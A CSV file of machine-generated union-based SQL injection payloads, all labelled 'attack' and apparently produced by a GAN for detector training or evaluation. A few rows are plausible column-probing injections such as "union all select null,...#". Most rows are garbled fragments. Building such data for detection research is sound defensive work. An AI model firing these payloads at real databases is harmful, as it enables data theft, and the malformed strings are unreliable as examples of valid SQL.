label,payload,family,payload_type,method,run_id,sample_index
attack,"  select @'1',1249,8123#rs where union select @s users @  )   4338",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,16
attack,"-3370'  )   where union all select @@-- VEs@'1'sid  where union all select null,5756,null,9988,1441,8665,5756,9814,8665,4300,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,17
attack,"8521%'  union all all all all all all 2571,@sion  (    )s union all all select from,1249I",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,18
attack,"-2190""  )    union all select 1,1441,3059,3072,5756,7348--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,19
attack,"-"" union all * where  =  )     )     )   union 1 4854 users,4266ersis@$as users  )sio  sers union all all u,vers wheresv@VE  VEEE@<ounion 1-- 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,20
attack,"-6097""  )    )     )    union all select usrsersid  =  as union select   @VERSION --,j,1 sers@,4266--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,21
attack,"1'    )    )   union select null,9357,1249,7497,9357#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,22
attack,"-8521' union all select 3990,9988,8986,9921,3990#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,23
attack,"-""   )     )     )    \as union all us where id  =  =  1 1646  =  1 union all select ,6737,null,5756,3480,5756,2263,5756,3072,9814,1646,7348,null,4300,5756,8123,8665,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,24
attack,"-4373  vhve""s where   ==  =  2011 $$  =  1 iselect all select from where @ 1917 us u,v@.ES   )    )     )    us where id  =  v$ 1646  (     unionselect 1,3072,null,1249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,25
attack,-43732639 union all union from ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,26
attack," * $ 7815  =  =  )    )  union all from null, 1646,9814,1249,6996 ersion where union 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,27
attack,"-%'  =    8268  )    union all from usersi)   union $ @Eselect usersisiod  2088    )    )    )    )    union _,1646",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,28
attack,"-s'  )  )    )    union * select from @ @Vs,v9110ioers id  =  '1' union all all union @(I+$   )    )    union all select u,7497#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,29
attack," 1494  )   )    )    O   union where 1917  (,4481--,5349er  )    )     )   whereunion all l,7845,5756,8123,null,1441,2263,9988,8123#,8665,7348,1224,5756,3072,4600--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,30
attack,"-6253' union all all select 1,vers -- users where idid  =  2571  . union all all select 6737,7348,3072,3072,4854,7348,7845,3072,2263,7348,null,1441,1441,9921--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,31
attack,"-)'  )    )    union all  1 -- 1917,4266,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,32
attack,"-4205's all all 4854 ,7845,7348,4854,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,33
attack,-3879 where union all  all select --O@@,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,34
attack,"-"" union all * 2285   u  @sersunion @1s ,@4711rs wheretser  )     wheres id  =  =  =  2571 $  8268'  )  I    a  '1' 8268  9517 union all select all#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,35
attack,-s where id  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,36
attack,"-""  )  )    union all select7348,9921,2639,null,1249,3084,4854,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,37
attack,"-)  )   union all all select ,v@$VEERSIOION1980  )    )   union all $",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,38
attack,"-6253 union select 8986,9322,1249,1249,5756,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,39
attack,"-6667""  (    )   -- union all all 1917,@3339,19801249,',v@ ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,40
attack,"1'  )    union all select null,9988,9921,9921,3072,4854#,1917,7348,4854,3072,4854--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,41
attack,"1'  )    )     )     )     )    )   where all all all select $,@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,42
attack," all select 2190,3990,1297,9322,5756,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,43
attack, 16461'  )   union all all all users where  @VE)    )    )  )     )   unionall select  us@V4338s whereverERSION er4338,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,44
attack,"-6667""  )   union all all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,45
attack,"-Q)'    )  )    )    union all select fromers i,8665,7348,1441,5756,8665,8123,2263--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,46
attack,"-4373% all all all select null,null,null,null,9814,null,4854,,9988,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,47
attack,"-%""  )    union all $$ 8123,@EE",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,48
attack,"-43736996'  )    )   union 8268  1 union select null,9322,3059,9357#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,49
attack, select 8890#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,50
attack,"-8812""  )     )   )    )     )     )    )  )   )     union all select null,4600,1249,1249,1249,1249,9814,3990,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,51
attack,"43736075 union null,4300,4300,9988,8123,9357,8123,9322,9814,7348,1441,7348,7348*#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,52
attack,"-2190 union all  all all from null,1249,5349,9110,3072,4266,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,53
attack,"-4205'  )    )    union all select from -- where @s union @sid  =  )    )     )    a  )   union all all all 8268,@,3072,1441,9814,9357rs --,1441,1249, ,4909,1249,1224,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,54
attack,-6097'')    union all * all all select from where@  =,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,55
attack,"-4373'+  (  select 'ers h  =  1 all all all all select null,4300,9814,9814,9322#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,56
attack,"  1,vers union all select 4481,1441,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,57
attack,"  1134 union * * $ us where where id  =  '1' as  =  S union all select 3084,12494909,2263rs where  -- @@ 9921,n Sst usersers where where id  =  all select null,6737,4300--#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,58
attack,"-4542e""  )     )    )     )    union all all all all all all 1  '1'  )   usersion  ( -- all' as id  =  1 select 7497,7497from,3072,1249,9814,7348,3072,73489921--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,59
attack,"-2190""    )    )    union all all $ all 4266,9110,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,60
attack,"-8812""    )    )   union all 8268,null,1249I",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,61
attack,"1'  )    )     )   union all all all all from users 2285sers' id  =  1980  =  1 or  20884266as where vb.er  =  =  =  =  )    )    )    union all  all all all  from us @sers union 8268,  cers ,vers  as in  1980 union all all select null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,62
attack," * all $ 3990 1@)   7348ers id  =  =  1 union all all all select from @1-- &&,veerE    )    vSION where @ ion  s union all 1494sersid  =  ($ union all select 4266 us,vers @1297 S,9921@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,63
attack,"-4205'    )    )    union all all 8268,1297,6996,1249,1249,69963480,8986,1249,1249'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,64
attack,"-2190  )     )    )    union all ,3059,2263,1297,9921--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,65
attack,"- union all from null,1646,3480,1249,1249,9814,'#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,66
attack,"-""  )   union all select 2285ERSINvers where",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,67
attack,"-3596""   )  )   )     )    )   union all select vem where nullersion  (  (    )    union from user  ss where union * . union * +$ 2446@s urs where id  =  1297 all select #",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,68
attack,-'s qo1eer  )    )  m  (I1249  )    )    union all select @3339sersid  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,69
attack,"-'  )   ""  )    )     )   union 8268,asrs where  =  2285 union select 7497@,3990,6996,*ers where3480  =s id  (  =  '1' union all all select null,null,null,null,4854,5756,3084#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,70
attack,-'  )   union all 1 --,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,71
attack,"-2207'')     )    )     )   union 2285  =  '1'  )    )   union all all $ @$$iod  =     )    )2011  1 select -,3072--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,72
attack,"-2639""""  )     )    )     )     )     )    )     )    union all 1980.  =  2088s V  )   union all * from1980)    )    union @#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,73
attack,"-5575  )    )    union all @$,2263,8986#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,74
attack,"-3879'  )    )    union  all  9921 all select ,7845,3059,7845#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,75
attack,"-3378""'  )    )    union all 2285,9814,7497,*,42669110,null,3072#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,76
attack,"-8308""  )   union all all select null,7348,1224,8123,@9921,2285#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,77
attack,"-4542'  =  1 union all all all * from where    er  =  1646 union * d+ + select 3084,verswhere id  =  '1' id  =  1    )    )    -- select null,null--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,78
attack,"1' union all all all * @II where  =  =  =  =  + 1 \. all select null,null1249,3072,3084,4854,4266--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,79
attack,"-3596'  )  ) unionall all select 4266,4600,@selectI,3059, 9921,7348,8123",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,80
attack,"-4542 union all all  select ,9322,8665,1441,4854,8665,9814,5756,9814,9921#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,81
attack,-5748'' where union all select u,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,82
attack,"-  )       )     )    )   union all select null,1297,1980,5756,1224,1224,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,83
attack,"-2639""  )    )     )    union all all null,7497--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,84
attack,"-3370""   )   )    )    )     )  )  =  1 bs union all all from usersers' id  =     8890 union all select 1980,@@V",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,85
attack,"-91561441'  )    )  )   union all all all select 4266,4266,7348,4909,1297,@@@VEERSION usersvid  I    )    )",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,86
attack,"-2625""  )    )   union all from users whereion where .  =  =n  =  2088 b  =  7815 . all all all select null,3480,,4854,4854,7348,7348,8123#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,87
attack,"1't  ( union all  all all 1,vers   usiE  . union all select -- --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,88
attack,"-ms  )    )   union all all null,null,,4266,2285,9814@,99881224,9921,7348,4854,7348,4909,4300,5756,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,89
attack,"-""a id  =  2088 union all all all all 1494,3072",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,90
attack,"-4542 union $ from union @&&ion users'  )    )  )     union1 union all all select null,null,7348,9814,1224,1441,8123,4300--,5756,9814#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,91
attack,"-3480'  )    union all from ers where id  =  =  1 union all all all all from ,9110,'seEE1134 $ us where id  =  1 union all all select 3990,9988,6996,4854,5756,7348,8665,5756,4854,7348,8665,1224,3084,7348,7348,8123,9322,4854--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,92
attack,"1 union all from select 2446,3480,3072,4909,5349rs where,ns,@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,93
attack,"-6253%'  )    )    union all select *ers where i, --",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,94
attack,"-""  )     (    union all select 4300,null",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,95
attack,"-7296""  )   )     )    )    )    unionunion select 2263,3480,4909,3059,1441,7348,7348,7348,3072,9814,9988,1249,',#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,96
attack,"-' where  )     )    )   union all all ,8123,#3339,8665,7348,8123,1441,7348,7348,3084##",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,97
attack," P union all from ,7497,6996,6996,1249,7845,'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,98
attack,,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,99
attack,"-4481'   )    )   union all all select  ,null,null,null,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,100
attack,"-3596""  )    )    )    union all all select 8268,1249,1249,1249,1249,'@sr where id  =  =  1 2088  =  $ select all -- 1#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,101
attack," select null,9921,7845,8123,7348,4266,2263,7348#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,102
attack,"-('  )   union all select null,null,null,null,null,9814,9814,8665,8123,7348##,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,103
attack," select 1,2285,6996,,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,104
attack,"1    )   union all 9988,7497,3990,1249,2446,1441,8986,3059,4909#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,105
attack,"'  =  )    union all select 8986,3059,null,7348,4854,53493990,1441,7348,2263,9988,7348,#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,106
attack,"-2446""  )   )    )    union all all all all  fromers where id  =      =  )    union all  us,1297,8665,1224,6996,1224,1249,7348",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,107
attack, 1494ers  )    union all '1' all select @Ssiod  ,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,108
attack,"-""   )     )    )    union all select @,1646,9814,4266,'@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,109
attack,"-2190'+  )   union select from,#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,110
attack,"-8073'    )    )    )    )  V    )   union all fromers ee(s whereei(  =  =  $ bd  )  =  9517 union all all '1' +. u where $ idd  . union all select null,null,null,null,null,null,4300,9988,9357,1224#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,111
attack,"-s'    )    )    union all all all select from,1249--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,112
attack,"-5575""  )   union all all null,1249,1249,1249,3084,1441,9814,3084#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,113
attack,"-7531'  )     )   id  =  =  '1'   union select null,4600,,6996,1249,6996--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,114
attack,"-9860""  )    )     )   )   )   union all  * us us@ersnullers usis where id  =  1 union all all select @1494VEERSION ",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,115
attack,"-2207''  )    )    )   union all all select 1646,@",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,116
attack,"-3370""  )     )    )    )    union all  all select ,9357,9921,1441,4300#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,117
attack,"'  )   union all select null,9814,null,null,1224,7348--,5756,8665,7348,4854,7348,8123,4854,9110#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,118
attack,"-""  )    union all all 1494,7348,8123,7348,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,119
attack,"-'  )    union all select null,7348,8123,3059#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,120
attack,"-6294""  )    union where all select from,null,3084#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,121
attack,"-3781'  )    )     union select all from where  (I  er  )     )     )    )     union select null,4600,7497,69961646,1249,v,3480,1249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,122
attack,"1' union all null,4481,4600,6996,1249,3072,6996,7348,3072,9814,4266,1249'O--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,123
attack,"-2207""  )    )     )    union * all select --,8986,3990,3990,6996,1249#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,124
attack,-6097'    )   union all all  from us#,union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,125
attack,"-6097' union select 4300,4300,5756,5756,4909,1441,1441,3072#,4300,8665,9814##,2263#rs'",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,126
attack,"-2207""  )   )   union all 1",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,127
attack,"-X-)<union 1 id  =  (  $ 9517  =  2088   union select fromers,verss useerrs us where id  =  '1'$ union all all select 1980,,1441,5756,7348,9814,7348,9921,3480,7348,7845#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,128
attack,"-8521  )   )     )    ) union all select from,1249,3059,1249,',1646,2446#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,129
attack,"-4373 union select null,null,9814,null#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,130
attack,"-%""  )   union all 2285,3072,1646,3084,69965349',1249's   8890,@@VERSION where@sas usersersnull,9921rs users us users id  2088  )  =  1 union all from *#sersid  =  7815  8890 all  select 4300,7497,--",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,131
attack,"-2207"" union * $ @or  =  '1'  =  )     v6996  )   )    )    )    where  )    union all all select all null,1441#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,132
attack,"-1401""s union 1494  =  all $er where id  =  t 7296 1980  1494  1917  )    )    )     )     )     union all select from @VESseis where )   as i(  1 union all 8268,2446,3990,9814rs id  =  =  =  all all 1917 usi=  2774 union all all select from ,3059,3990,5756,67371249",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,133
attack," select null,@@VERSI--S usrs +  )     )   union select null,4266,4854,null,4300,7348,5756,5756#",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,134
attack,"-7296'   )    )    )     )    union all select @1494EV,vers @.ser  &&    where  e)  )    union all from @s's id  =  =  '1' union 1 union $ where null,ver  s us@$s us  =  =s id  1 \.  v4338 union all all * @1I-- u3480EV2088  )    as union all select null,null,4266,null,9814,9814,7348,5756,7348,9988,7348,1249,",union,union,seqgan_improved,seqgan_improved__phase3__union__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,135
